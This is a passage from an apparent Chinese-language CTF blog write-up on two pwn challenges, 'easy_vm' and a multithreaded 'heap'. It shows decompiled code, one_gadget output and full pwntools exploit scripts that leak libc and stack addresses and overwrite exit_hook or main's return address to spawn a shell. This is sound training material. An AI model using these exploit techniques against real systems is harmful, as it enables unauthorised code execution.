class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It&#x27;s a easy vmpwn,enjoy it&quot;</span>);<br>  ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);<br>  <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//进入unsortedbin，其 fd、bk 指针指向 main_arena+88 的位置（第一个进入unsortedbin的chunk的性质）,可以泄露libc</span><br>  ptr = <span class="hljs-number">0LL</span>;<br>  qword_201040 = (__int64)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);<br>  buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);   <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Inputs your code:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x1000</span>uLL);<br>  <span class="hljs-keyword">while</span> ( *(_BYTE *)buf )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( *(_BYTE *)buf )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        qword_201040 += <span class="hljs-number">8LL</span>;<br>        *(_QWORD *)qword_201040 = qword_201038; <span class="hljs-comment">//保存201038的内容</span><br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">8</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        qword_201038 = *(_QWORD *)qword_201040;<br>        qword_201040 -= <span class="hljs-number">8LL</span>;<br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">8</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        *(_QWORD *)qword_201038 = *(_QWORD *)qword_201040;<span class="hljs-comment">//赋值，将201040里的内容赋给201038</span><br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">8</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        qword_201038 ^= *((_QWORD *)buf + <span class="hljs-number">1</span>);<br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">16</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        qword_201038 = *(_QWORD *)qword_201038;<br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">8</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>        qword_201038 += *((_QWORD *)buf + <span class="hljs-number">1</span>);<br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">16</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:                                     <br>        qword_201038 -= *((_QWORD *)buf + <span class="hljs-number">1</span>);<br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">16</span>;<br>        <span class="hljs-keyword">break</span>;        <span class="hljs-comment">//case6 case7可以实现调偏移</span><br>      <span class="hljs-keyword">default</span>:<br>        buf = (<span class="hljs-type">char</span> *)buf + <span class="hljs-number">8</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>one_gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-number">0x45216</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x30</span>, environ)<br>constraints:<br>  rax == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0x4526a</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x30</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x30</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0xf02a4</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x50</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x50</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0xf1147</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x70</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x70</span>] == <span class="hljs-literal">NULL</span><br><br></code></pre></td></tr></table></figure>
<p>先给 0x201038 一个 libc（2），算 one_gadget（7）保存到 0x201040（1），再算 exit_hook（6），用（3）将 one_gadget 赋值到 0x201038 的 exit_hook 中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./easy_vm&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">23804</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>libc = <span class="hljs-number">0x3c4b78</span><br>exit1 = <span class="hljs-number">0x5f0040</span> + <span class="hljs-number">3848</span><br>exit2 = <span class="hljs-number">0x5f0040</span> + <span class="hljs-number">3856</span><br>one_gadget = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>payload = p64(<span class="hljs-number">2</span>)                    <span class="hljs-comment">#libc</span><br>payload+= p64(<span class="hljs-number">7</span>)                    <br>payload+= p64(libc - one_gadget[<span class="hljs-number">3</span>]) <span class="hljs-comment">#calc_onegadget</span><br>payload+= p64(<span class="hljs-number">1</span>)                    <span class="hljs-comment">#gadget_push_in_201040 </span><br>payload+= p64(<span class="hljs-number">6</span>)                    <br>payload+= p64(exit1 - one_gadget[<span class="hljs-number">3</span>])<span class="hljs-comment">#calc_exit_hook </span><br>payload+= p64(<span class="hljs-number">3</span>)                    <br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&#x27;Inputs your code:\n&#x27;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><strong>heap</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1732</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-11Ch]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *srca; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  src = strtok(a1, <span class="hljs-string">&quot;:&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( src )<br>  &#123;<br>    <span class="hljs-built_in">strcpy</span>(a1, src);<br>    srca = strtok(<span class="hljs-number">0LL</span>, &amp;byte_21DA);<br>    <span class="hljs-keyword">if</span> ( srca )<br>      <span class="hljs-built_in">strcpy</span>(dest, srca);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The paper index loading&quot;</span>);<br>  v2 = atoi(a1);<br>  v3 = *(_DWORD *)(*((_QWORD *)s + v2) + <span class="hljs-number">8LL</span>);<br>  sleep(<span class="hljs-number">1u</span>);   <span class="hljs-comment">//竞争窗口</span><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *((_QWORD *)s + v2) )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;paper index: %d\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input the new paper content&quot;</span>);<br>    <span class="hljs-built_in">strncpy</span>(**((<span class="hljs-type">char</span> ***)s + v2), dest, v3);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid paper index&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v7 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>多线程未加锁导致竞争条件。edit 存在 1 秒的竞争窗口，且竞争窗口过后没有更新 v3。<br>同时没有限制堆块大小，可以申请一个大chunk1<br>在竞争窗口中free掉chunk1，同时申请小堆块chunk2<br>此时可以对chunk2进行溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_1469</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  _DWORD *v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span> &amp;&amp; *((_QWORD *)s + i); ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">16</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;paper pool is full&quot;</span>);<br>  v3 = <span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">79</span> || v3 &gt; <span class="hljs-number">104</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;paper size error&quot;</span>);<br>  v4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *(_QWORD *)v4 = <span class="hljs-built_in">malloc</span>(v3);<br>  v4[<span class="hljs-number">2</span>] = v3;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;creating paper with index %d\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input the paper content&quot;</span>);<br>  <span class="hljs-built_in">strncpy</span>(*(<span class="hljs-type">char</span> **)v4, a1, v3);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>  result = (<span class="hljs-type">int</span>)v4;<br>  *((_QWORD *)s + i) = v4;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>溢出对象是保存堆块地址的小堆块,也就是这里的v4<br>因为edit用的是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">strncpy</span>(*(<span class="hljs-type">char</span> **)v4, a1, v3);<br></code></pre></td></tr></table></figure>
<p>我们要注意溢出空间不能过大，以免破坏其他数据</p>
<p>首先泄漏 libc 地址。线程的堆块都分配至单独的线程堆 （堆地址以 0x7f 开头），arena 的位置就位于堆空间上方，所以只要溢出修改 ptr 低位就可以将其指向 arena，从而泄漏 arena 上的 libc 地址（泄漏出来的地址恰好是 main arena 地址）。</p>
<p>getshell 方法是泄漏 libc 上的栈地址，然后将栈上的 main 函数返回地址修成 one gadget 地址。libc 上有两处地方可以泄漏栈地址，__environ 和 __libc_argv，这道题只能使用后者，因为前者地址的最低位恰好是空字节。</p>
<p>栈需要修改两个地方，第一个是前面提到的 main 函数返回地址，第二个是 main 函数的 saved rbp。修改 saved rbp 是为了满足 one gadget 利用条件（下图这个），原来的 saved rbp 是数值 1，需要把它改成任意一个可写内存地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xebdb3</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rbp<span class="hljs-number">-0x50</span>, [rbp<span class="hljs-number">-0x70</span>])<br>constraints:<br>  address rbp<span class="hljs-number">-0x50</span> is writable<br>  [rbp<span class="hljs-number">-0x50</span>] == <span class="hljs-literal">NULL</span> || rbp<span class="hljs-number">-0x50</span> == <span class="hljs-literal">NULL</span><br>  [[rbp<span class="hljs-number">-0x70</span>]] == <span class="hljs-literal">NULL</span> || [rbp<span class="hljs-number">-0x70</span>] == <span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> warnings<br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=BytesWarning)<br><br><span class="hljs-keyword">import</span> time<br><br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>p= process(<span class="hljs-string">&#x27;./heap&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./heap&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;tcp.cloud.dasctf.com&quot;, 21479)</span><br><br>libc = ELF(<span class="hljs-string">&quot;./libc-3.35.so&quot;</span>)<br><br>sla      = <span class="hljs-keyword">lambda</span> x, y : p.sendlineafter(y, <span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> x) <br>sl       = <span class="hljs-keyword">lambda</span> x : p.sendline(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> x)<br>sa       = <span class="hljs-keyword">lambda</span> x, y : p.sendafter(y, <span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> x)   <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ctx</span>):<br>    sla(<span class="hljs-string">f&quot;1 <span class="hljs-subst">&#123;ctx&#125;</span>&quot;</span>, <span class="hljs-string">&quot;Your chocie:&quot;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ctx</span>):<br>    sla(<span class="hljs-string">f&quot;2 <span class="hljs-subst">&#123;ctx&#125;</span>&quot;</span>, <span class="hljs-string">&quot;Your chocie:&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, ctx</span>):<br>    pp = <span class="hljs-string">b&quot;3 &quot;</span> + <span class="hljs-built_in">str</span>(idx).encode() + <span class="hljs-string">b&quot;:&quot;</span> + ctx<br>    sla(pp, <span class="hljs-string">&quot;Your chocie:&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_no</span>(<span class="hljs-params">idx, ctx</span>):<br>    pp = <span class="hljs-string">b&quot;3 &quot;</span> + <span class="hljs-built_in">str</span>(idx).encode() + <span class="hljs-string">b&quot;:&quot;</span> + ctx<br>    sl(pp)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">f&quot;4 <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>, <span class="hljs-string">&quot;Your chocie:&quot;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free_no</span>(<span class="hljs-params">idx</span>):<br>    sl(<span class="hljs-string">f&quot;4 <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br><br>add(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk0</span><br>add(<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">0x61</span>)<br>add(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk3</span><br>add(<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-string">&quot;c&quot;</span>*<span class="hljs-number">0x62</span>)<br>add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk6</span><br>add(<span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x66</span>)<br>add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk9</span><br>add(<span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x66</span>)<br><br><br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;X&quot;</span>*<span class="hljs-number">0x60</span>+<span class="hljs-string">b&quot;\x80&quot;</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">0x61</span>) <span class="hljs-comment">#chunk0</span><br>add(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk2</span><br><br>time.sleep(<span class="hljs-number">3</span>)<br><br><br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">5</span>, <span class="hljs-string">b&quot;x&quot;</span>*<span class="hljs-number">0x60</span>+<span class="hljs-string">b&quot;\xa0\x08&quot;</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-string">&quot;c&quot;</span>*<span class="hljs-number">0x62</span>) <span class="hljs-comment">#chunk3</span><br>add(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk5</span><br><br>time.sleep(<span class="hljs-number">3</span>)<br><br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&quot;paper content: &quot;</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x219c80</span><br>success(<span class="hljs-string">&quot;libcbase: 0x%lx&quot;</span>, libc.address)<br><br><br>p_stack = libc.address + <span class="hljs-number">0x21aa20</span><br>edit_no(<span class="hljs-number">1</span>, p64(p_stack)[:<span class="hljs-number">6</span>])<br><br>time.sleep(<span class="hljs-number">3</span>)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;paper content: &quot;</span>)<br>stack = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_ret_addr = stack-<span class="hljs-number">0x110</span><br><br>success(<span class="hljs-string">&quot;stackbase: 0x%lx&quot;</span>, libc.address)<br>success(<span class="hljs-string">&quot;main ret address ptr: 0x%lx&quot;</span>, main_ret_addr)<br><br><br>free_no(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>*<span class="hljs-number">0x60</span>+p64(main_ret_addr-<span class="hljs-number">8</span>)[:<span class="hljs-number">6</span>])<br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x66</span>) <span class="hljs-comment">#chunk3</span><br>add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk5</span><br><br>time.sleep(<span class="hljs-number">3</span>)<br><br>writable_ptr_b = p64(libc.address + <span class="hljs-number">0x21c240</span>)<br><br>edit(<span class="hljs-number">7</span>, writable_ptr_b[:<span class="hljs-number">6</span>])<br><br><br>free_no(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">11</span>, <span class="hljs-string">b&quot;0&quot;</span>*<span class="hljs-number">0x60</span>+p64(main_ret_addr)[:<span class="hljs-number">6</span>])<br>free(<span class="hljs-number">11</span>)<br>add(<span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x66</span>) <span class="hljs-comment">#chunk3</span><br>add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#chunk5</span><br><br>time.sleep(<span class="hljs-number">3</span>)<br><br>one_gadget_b =p64(libc.address + <span class="hljs-number">0xEBD48</span>)<br>edit(<span class="hljs-number">10</span>, one_gadget_b[:<span class="hljs-number">6</span>])<br><br>time.sleep(<span class="hljs-number">3</span>)<br><br>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/06/exit-hook/">← Next exit_hook</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/02/house-of-force/">house_of_force Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
